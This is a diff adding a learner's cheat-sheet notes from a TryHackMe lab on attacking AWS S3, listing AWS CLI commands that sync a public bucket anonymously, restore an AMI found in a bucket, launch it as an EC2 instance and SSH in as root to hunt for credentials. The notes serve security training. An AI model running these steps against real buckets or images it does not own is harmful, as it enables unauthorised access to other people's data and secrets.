@@ -125,7 +125,23 @@ kali@kali$ aws s3 sync s3://assets.bestcloudcompany.org . --no-sign-request
 
 [from: https://tryhackme.com/room/awss3service ; Task 6 - "Lab: Attacking Public S3 Buckets"]
 ----------------------------------------------------------------------------------------------------------------
+[from: https://tryhackme.com/room/awss3service ; Task 8 - "Lab: S3 - Abusing the Substrate"]
+Generate an Amazon Machine Image (AMI) from a .ami binary file found in an S3 bucket; it may contain sensitive info such as UN/PW combinations)
 
+kali@kali$ aws configure
+# input creds to access the AWS account
 
+kali@kali$ aws ec2 create-restore-image-task --object-key {AMI_Object_ID} --bucket <NAME_OF_S3_BUCKET> --name {Unique_Name}
+# {AMI_Object_ID} = replace with full name of the AMI image including the .ami
+# {Unique_Name} = replace with a name you choose
 
+kali@kali$ aws ec2 create-key-pair --key-name <NAME_CHOSEN_FOR_KEY> --query "KeyMaterial" --output text > ~/.ssh/<NAME_CHOSEN_FOR_KEY_FILE>.pem
 
+kali@kali$ aws ec2 describe-subnets
+
+kali@kali$ aws ec2 describe-security-groups
+
+kali@kali$ aws ec2 run-instances --image-id {ID_From_Restored_Image} --instance-type <CHOSEN_INSTANCE_TYPE> --key-name {Your_Key_Name} --subnet-id <ID_OF_CHOSEN_SUBNET> --security-group-id <ID_OF_CHOSEN_SECURITY_GROUP>
+
+kali@kali$ ssh -i "~/.ssh/<NAME_CHOSEN_FOR_KEY_FILE>.pem" root@{EC2_Public_IP_Address}
+----------------------------------------------------------------------------------------------------------------
